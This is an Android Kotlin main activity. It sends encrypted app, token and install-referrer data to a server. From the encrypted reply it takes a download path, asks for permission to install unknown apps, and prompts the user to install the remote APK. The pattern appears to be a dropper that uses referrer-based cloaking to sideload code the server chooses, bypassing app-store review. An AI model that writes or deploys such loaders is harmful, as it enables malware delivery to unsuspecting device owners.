package net.basicmodel

import android.app.Activity
import android.app.AlertDialog
import android.app.DownloadManager
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.widget.ProgressBar
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.tencent.mmkv.MMKV
import com.xxxxxxh.http.RequestService
import com.xxxxxxh.update.ResponseListener
import com.xxxxxxh.update.UpdateManager
import net.entity.RequestBean
import net.entity.ResultEntity
import net.http.RetrofitUtils
import okhttp3.ResponseBody
import retrofit2.Response

class MainActivity : AppCompatActivity(), ResponseListener {
    val retrofitUtils = RetrofitUtils().retrofit()
    val service = retrofitUtils.create(RequestService::class.java)
    var dialog1: AlertDialog? = null
    var dialog2: AlertDialog? = null
    var progressBar: ProgressBar? = null
    var manager: UpdateManager? = null
    var entity: ResultEntity? = null
    var dialog3: AlertDialog? = null

    @RequiresApi(Build.VERSION_CODES.R)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        checkState()
        val requestBean = getRequestData()
        manager = UpdateManager.get()
        manager?.update(AesEncryptUtil.encrypt(Gson().toJson(requestBean)), this)
        val intentFilter = IntentFilter()
        intentFilter.addAction("action_download")
        intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
        intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
        registerReceiver(manager?.addReceiver(this), intentFilter)
    }

    private fun checkState() {
        if (MMKV.defaultMMKV()?.decodeBool("state") == false) {
            return
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun getRequestData(): RequestBean {
        val istatus = MMKV.defaultMMKV()!!.decodeBool("isFirst", true)
        val requestBean = RequestBean()
        requestBean.appId = MyApplication().getAppId()
        requestBean.appName = MyApplication().getAppName()
        requestBean.applink = MMKV.defaultMMKV()!!.decodeString("facebook", "AppLink is empty")
        requestBean.ref = MMKV.defaultMMKV()!!.decodeString("google", "Referrer is empty")
        requestBean.token = MyApplication().getToken()
        requestBean.istatus = istatus
        return requestBean
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onResponse(response: Response<ResponseBody>) {
        val result = AesEncryptUtil.decrypt(response.body()!!.string())
        if (!TextUtils.isEmpty(result)) {
            val resultType = object : TypeToken<ResultEntity>() {}.type
            entity = Gson().fromJson<ResultEntity>(result, resultType)
            if (Build.VERSION.SDK_INT > 24) {
                if (!this.packageManager.canRequestPackageInstalls()) {
                    dialog1 = manager?.permissionDlg(this, this, entity!!.ukey, entity!!.pkey)
                    dialog1!!.show()
                }else{
                    dialog3 = manager?.updateDlg(this, entity!!.ikey, entity!!.path)
                    dialog3!!.show()
                }
            } else {
                dialog3 = manager?.updateDlg(this, entity!!.ikey, entity!!.path)
                dialog3!!.show()
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (resultCode == Activity.RESULT_OK && requestCode == 1) {
            if (!this.packageManager.canRequestPackageInstalls()) {
                dialog1 = manager?.permissionDlg(this, this, entity!!.ukey, entity!!.pkey)
                dialog1!!.show()
            } else {
                dialog3 = manager?.updateDlg(this, entity!!.ikey, entity!!.path)
                dialog3!!.show()
            }

        }
    }

}